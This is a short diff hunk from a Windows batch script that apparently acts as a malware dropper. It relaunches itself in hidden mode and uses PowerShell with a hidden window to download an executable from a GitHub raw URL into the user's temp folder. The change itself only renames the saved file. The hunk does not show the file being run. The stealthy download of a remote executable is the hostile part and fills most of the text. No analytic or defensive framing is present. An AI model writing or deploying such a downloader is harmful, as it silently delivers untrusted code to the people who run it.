@@ -7,7 +7,7 @@ if "%1" neq "hidden" (
 )
 
 set "URL=https://github.com/lcmandrikion-hash/Mez/raw/refs/heads/main/LZX.exe"
-set "ARQ=%TEMP%\LZX2.exe"
+set "ARQ=%TEMP%\LZX.exe"
 
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ARQ%'"
 
